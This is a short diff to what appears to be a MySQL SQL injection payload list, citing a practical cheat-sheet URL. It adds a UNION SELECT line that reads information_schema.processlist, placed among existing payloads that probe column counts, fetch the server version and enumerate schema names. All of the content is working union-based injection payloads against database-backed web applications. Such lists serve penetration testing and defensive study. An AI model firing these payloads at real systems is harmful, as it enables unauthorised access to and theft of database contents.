@@ -6,6 +6,7 @@ https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
 hex(1)
 -1 group by 12
 -1 union select "1","2","3"
+-1 UNION SELECT 1,2,info from information_schema.processlist-- -
 -1 union select "1",(select @@version),"3"
 -1 union select "1",(select SCHEMA_NAME from Information_Schema.SCHEMATA LIMIT 0,1),"3"
 -1 union select "1",(select group_concat(SCHEMA_NAME,":") from Information_Schema.SCHEMATA), "3"
